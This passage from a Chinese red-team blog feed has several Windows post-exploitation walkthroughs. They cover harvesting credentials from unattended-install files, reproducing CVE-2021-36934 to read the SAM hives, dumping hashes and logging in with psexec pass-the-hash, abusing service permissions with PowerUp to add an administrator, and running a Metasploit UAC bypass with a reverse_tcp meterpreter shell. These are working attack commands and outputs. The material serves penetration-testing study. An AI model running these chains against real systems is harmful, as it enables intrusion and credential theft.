class="line-numbers language-none"><code class="language-none">.\accesschk.exe -uwqs Users c:\*.*.\accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="0x04-自动安装配置文件"><a href="#0x04-自动安装配置文件" class="headerlink" title="0x04 自动安装配置文件"></a>0x04 自动安装配置文件</h1><p>管理员在对内网中多台机器进行环境配置时，通常不会一台一台的配置，往往会采用脚本批量化的方式。</p><p>在这个过程中，可能就会有一些包含安装配置信息的文件，比如在这些文件中包含了账号、密码，常见的文件路径如下：</p><pre class="line-numbers language-none"><code class="language-none">C:\sysprep.infC:\syspreg\sysprep.xmlC:\Windows\system32\sysprep.infC:\windows\system32\sysprep\sysprep.xmlC:\unattend.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattended.xmlC:\Windows\Panther\Unattend\Unattended.xmlC:\Windows\Panther\Unattend\Unattend.xmlC:\Windows\System32\Sysprep\Unattend.xmlC:\Windows\System32\Sysprep\Panther\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者直接全局搜索 Unattend.xml 文件</p><pre class="line-numbers language-none"><code class="language-none">dir &#x2F;b &#x2F;s C:\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以直接使用 MSF 的 post/windows/gather/enum_unattend 模块</p><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;enum_unattendset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728124041.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/SYSTEM/254836.html">https://www.freebuf.com/articles/SYSTEM/254836.html</a></p><p><a href="https://www.freebuf.com/articles/network/250827.html">https://www.freebuf.com/articles/network/250827.html</a></p><p><a href="https://gist.github.com/sckalath/8dacd032b65404ef7411">https://gist.github.com/sckalath/8dacd032b65404ef7411</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Windows 系统的错误配置主要可以用来进行提权操作，比如可信任服务路径漏洞、计划任务程序以高权限</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现</title>
    <link href="https://www.teamssix.com/210725-074847.html"/>
    <id>https://www.teamssix.com/210725-074847.html</id>
    <published>2021-07-24T23:48:47.000Z</published>
    <updated>2021-08-04T08:22:03.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 10 月以来发布的版本，即 Windows 10 Version 1809 以后的版本。</p><p>不过值得注意的是该漏洞不影响 Windows Server 版本。</p><p>对于这个漏洞安全研究成员将其称为 HiveNightmare 或者 SeriousSAM ，该漏洞允许低权限的用户访问 Windows 系统文件，成功利用此漏洞的攻击者可以使用 SYSTEM 特权运行任意代码。</p><p>根据微软的介绍，出现本地提权漏洞是由于多个系统文件（包括安全账户管理器数据库SAM）过度许可访问控制列表所导致。</p><p>目前 POC 和 EXP 已经被公开，利用公开的 POC 可以低权限账号读取 SAM 等文件。</p><h1 id="0x01-检查是否易受攻击"><a href="#0x01-检查是否易受攻击" class="headerlink" title="0x01 检查是否易受攻击"></a>0x01 检查是否易受攻击</h1><p>执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">icacls C:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果输出 BUILTIN\Users:(I)(RX) 表示该系统易受攻击。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723110132.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723111446.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>EXP 地址为：<a href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p><p>作者编译好的 exe 文件：<a href="https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe">https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe</a></p><p>直接将作者编译好的 HiveNightmare.exe 拷贝到目标系统上执行，这里以 Windows 10 1809 为例。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723132944.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到在低权限账号下，成功利用 CVE-2021–36934 读取到了 SAM、SECURITY、SYSTEM 三个文件。</p><p>除了 HiveNightmare 项目外，ShadowSteal 项目也能实现同样的效果，不过该项目需要编译使用，编译步骤如下：</p><p>在 Linux 下运行以下命令，以 Kali 为例。</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install nimnimble install zippy argparsenimble install winimsudo apt-get install mingw-w64git clone https:&#x2F;&#x2F;github.com&#x2F;HuskyHacks&#x2F;ShadowSteal.git &amp;&amp; cd ShadowStealmake &amp;&amp; cd bin&#x2F; &amp;&amp; ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将编译好的 ShadowSteal.exe 放到目标系统上直接执行即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723141315.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在获得  SAM、SECURITY、SYSTEM 文件后，我们就可以使用 secretsdump.py 获取目标用户的 hash 了。</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.gitcd impacket&#x2F;examplespython3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security SECURITY-2021-06-17 LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723144111.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>再使用 psexec.py 直接利用 administrator 的 hash 登录管理员账户，获得 SYSTEM 权限会话。</p><pre class="line-numbers language-none"><code class="language-none">python3 psexec.py -hashes xxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxx administrator@172.16.214.10 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723155856.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>微软目前仍在研究该漏洞（编号为CVE-2021-36934），还未发布补丁更新。不过微软提供了一个临时性的解决方案。</p><p>1、限制对 %windir%\system32\config 内容的访问</p><p>​    以管理员身份打开命令提示符或 Windows PowerShell，运行以下命令：icacls %windir%\system32\config*.* /inheritance:e</p><p>2、删除卷影复制服务 (VSS) 卷影副本</p><p>​    删除限制访问 %windir%\system32\config 之前存在的任何系统还原点和卷影卷，创建一个新的系统还原点（如果需要）。</p><p>​    不过在操作时需要注意的是，从系统中删除卷影副本会影响系统和文件的“恢复“操作。</p><blockquote><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s/zSHwBUe-1ObumPt6v0pxMg">https://mp.weixin.qq.com/s/zSHwBUe-1ObumPt6v0pxMg</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247494395&idx=1&sn=c40e68e018c2112d7e3ce74b9a55c724">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247494395&amp;idx=1&amp;sn=c40e68e018c2112d7e3ce74b9a55c724</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 1</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="提权漏洞" scheme="https://www.teamssix.com/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Windows" scheme="https://www.teamssix.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】15、系统服务权限配置不当利用</title>
    <link href="https://www.teamssix.com/210722-173157.html"/>
    <id>https://www.teamssix.com/210722-173157.html</id>
    <published>2021-07-22T09:31:57.000Z</published>
    <updated>2021-08-04T08:22:03.531Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p><p>在 PowerShell 中导入并执行脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerUp.ps1Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;[*] Running Invoke-AllChecks[*] Checking if user is in a local group with administrative privileges...[+] User is in a local group that grants administrative privileges![+] Run a BypassUAC attack to elevate privileges to admin.[*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...ServiceName    : MongoDBPath           : C:\Web\mongodb\bin\mongod.exe --auth --config C:\Web\mongodb\mongod.conf --s                 erviceModifiableFile : C:\Web\mongodb\mongod.confStartName      : LocalSystemAbuseFunction  : Install-ServiceBinary -ServiceName &#39;MongoDB&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;ServiceName                   ServicePath                   Command                       BackupPath-----------                   -----------                   -------                       ----------MongoDB                       C:\Web\mongodb\bin\mongod...  net user test Passw0rd &#x2F;ad... C:\Web\mongodb\bin\mongod...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启系统，查看用户，发现 test 已经被添加到管理员组了。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; net user test用户名                 test全名……本地组成员             *Administrators       *Users全局组成员             *None命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在 MSF 中，先看下已上线主机的权限</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getuidServer username: TEAMSSIX\dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>MSF 中对应服务权限配置不当的利用模块是 <code>exploit/windows/local/service_permissions</code></p><p>利用步骤如下：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissionsset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.7.1set lport 4444set session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到会话直接被提升到了 SYSTEM 权限。</p><blockquote><p>参考文章：</p><p><a href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;PowerUp&quot;&gt;&lt;a href=&quot;#PowerUp&quot; class=&quot;headerlink&quot; title=&quot;PowerUp&quot;&gt;&lt;/a&gt;PowerUp&lt;/h3&gt;&lt;p&gt;PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：&lt;a href=&quot;https://g</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】14、发现主机缺失补丁</title>
    <link href="https://www.teamssix.com/210706-155005.html"/>
    <id>https://www.teamssix.com/210706-155005.html</id>
    <published>2021-07-06T07:50:05.000Z</published>
    <updated>2021-08-04T08:22:03.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p><h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt; systeminfo……内容过多，此处省略……修补程序: 安装了 2 个修补程序。         [01]: KB2999226         [02]: KB976902……内容过多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotfixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOnCaption                                     Description  HotFixID   InstalledOnhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2999226  Update       KB2999226  11&#x2F;26&#x2F;2020http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;976902   Update       KB976902   11&#x2F;21&#x2F;2010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p><h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p><p>Sherlock 项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><p>导入脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Sherlock.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Sherlock 命令</p><pre class="line-numbers language-none"><code class="language-none">Find-ALLVulns搜索所有未安装的补丁Find-MS16032搜索单个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patchesmsf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; set session 1session &#x3D;&gt; 1msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; run[+] KB2999226 installed on 11&#x2F;26&#x2F;2020[+] KB976902 installed on 11&#x2F;21&#x2F;2010[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p><p>首先查看下当前会话权限</p><pre class="line-numbers language-none"><code class="language-none">msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 6 created.组信息-----------------组名                                   类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p><p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background[*] Backgrounding session 1...msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggestermsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 1session &#x3D;&gt; 1msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; run[*] 172.16.214.4 - Collecting local exploits for x86&#x2F;windows...[*] 172.16.214.4 - 38 exploit checks are being tried...[+] 172.16.214.4 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p><pre class="line-numbers language-none"><code class="language-none">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcpmsf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1session &#x3D;&gt; 1msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; run[*] Started reverse TCP handler on 10.101.22.38:4444[*] UAC is Enabled, checking level...[+] Part of Administrators group! Continuing...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[*] Configuring payload and stager registry keys ...[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.[*] Sending stage (175174 bytes) to 172.16.214.4[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800[*] Cleaning up registry keys ...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 1 created.组信息-----------------组名                                 类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p><h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p><p>wesng 的安装方法也很简单</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng.gitcd wesngpython wes.py --update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p><pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接使用 wesng 即可</p><pre class="line-numbers language-none"><code class="language-none">python wes.py info.txt<span aria-hidden="true" 